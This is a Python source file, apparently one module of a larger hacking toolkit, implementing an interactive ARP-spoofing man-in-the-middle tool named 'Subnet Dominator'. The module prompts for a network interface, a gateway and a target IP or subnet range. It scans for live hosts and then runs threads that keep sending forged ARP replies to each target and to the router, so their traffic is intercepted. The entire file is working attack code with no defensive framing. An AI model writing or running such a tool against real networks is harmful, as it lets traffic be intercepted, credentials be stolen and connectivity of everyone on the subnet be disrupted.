import os
import time
import threading
from scapy.all import ARP, sendp, Ether, srp, IP, conf, get_if_list
from rich.console import Console
from rich.table import Table
from core.ui import draw_header

console = Console()


class MITMEngine:
    def __init__(self):
        self.stop_event = threading.Event()
        self.interface = ""
        self.gateway_ip = ""
        self.targets = []

    def get_interfaces(self):
        """Fetches a list of valid network interfaces from Scapy."""
        return get_if_list()

    def get_mac(self, ip):
        """Resolves MAC address for a given IP on the selected interface."""
        try:
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip),
                         timeout=2, verbose=False, iface=self.interface)
            return ans[0][1].hwsrc if ans else None
        except Exception:
            return None

    def poison(self, target_ip, target_mac, gateway_mac):
        """Sends spoofed ARP packets to intercept traffic."""
        target_pkt = Ether(dst=target_mac)/ARP(op=2, pdst=target_ip,
                                               hwdst=target_mac, psrc=self.gateway_ip)
        router_pkt = Ether(dst=gateway_mac)/ARP(op=2,
                                                pdst=self.gateway_ip, hwdst=gateway_mac, psrc=target_ip)

        while not self.stop_event.is_set():
            sendp(target_pkt, verbose=False, iface=self.interface)
            sendp(router_pkt, verbose=False, iface=self.interface)
            time.sleep(2)

    def run(self):
        draw_header("MITM Engine: Subnet Dominator")

        # --- FIX: Interface Discovery ---
        ifaces = self.get_interfaces()
        table = Table(title="Available Network Interfaces",
                      border_style="cyan")
        table.add_column("Interface Name", style="bold green")
        for i in ifaces:
            table.add_row(i)
        console.print(table)

        self.interface = console.input(
            "[bold yellow]Enter exact Interface from list (e.g., wlan0): [/bold yellow]").strip()

        if self.interface not in ifaces:
            console.print(
                f"[bold red][!] Error:[/bold red] '{self.interface}' is not a valid interface.")
            input("\nPress Enter to return...")
            return

        self.gateway_ip = console.input(
            "[bold yellow]Gateway (Router) IP: [/bold yellow]")
        target_input = console.input(
            "[bold yellow]Target IP or Range (e.g. 192.168.1.5 or 192.168.1.0/24): [/bold yellow]")

        # Resolve Gateway
        console.print("[*] Resolving Gateway MAC...")
        gw_mac = self.get_mac(self.gateway_ip)
        if not gw_mac:
            console.print(
                "[red][!] Could not resolve Gateway MAC. Check your connection.[/red]")
            input("\nPress Enter...")
            return

        # Resolve Targets
        console.print("[*] Mapping targets on the subnet...")
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=target_input),
                     timeout=2, verbose=False, iface=self.interface)

        self.targets = [(rcv.psrc, rcv.hwsrc)
                        for _, rcv in ans if rcv.psrc != self.gateway_ip]

        if not self.targets:
            console.print(
                "[red][!] No active targets found in the specified range.[/red]")
            input("\nPress Enter...")
            return

        console.print(
            f"[bold green][+] Poisoning {len(self.targets)} targets...[/bold green]")
        for ip, mac in self.targets:
            threading.Thread(target=self.poison, args=(
                ip, mac, gw_mac), daemon=True).start()

        try:
            console.print(
                "[bold red][!] Interception Active. Press Ctrl+C to stop.[/bold red]")
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            self.stop_event.set()
            console.print(
                "\n[yellow][*] Stopping attack and cleaning up...[/yellow]")
            time.sleep(2)


def start_mitm():
    engine = MITMEngine()
    engine.run()
